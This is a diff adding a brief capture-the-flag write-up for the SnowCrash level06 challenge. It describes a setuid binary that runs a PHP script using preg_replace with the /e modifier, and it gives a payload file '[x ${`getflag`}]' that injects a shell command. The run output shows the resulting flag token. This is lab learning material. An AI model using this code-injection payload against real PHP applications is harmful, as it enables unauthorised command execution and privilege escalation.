@@ -1,0 +1,23 @@
+we have 2 files level06.php and level06
+level06 is binary file, by analysing it with ghidra
+we can see that the script is using the file level06 as a parameter
+ to execute the php script level06.php with the permission of the user
+ who own the file level06
+
+ level06.php:
+ the script is using the function preg_replace with the option /e
+this option allow the evaluation of php code in the regular expression
+
+so we can inject a command in this script via the input file
+the script search for a string that match the pattern /(\[x (.*)\])/e
+so:
+echo '[x ${`getflag`}]' > /tmp/payload.txt
+the `` operator in php is used to execute shell command
+
+then:
+./level06 /tmp/payload.txt
+
+level06@SnowCrash:~$ ./level06 /tmp/payload.txt
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
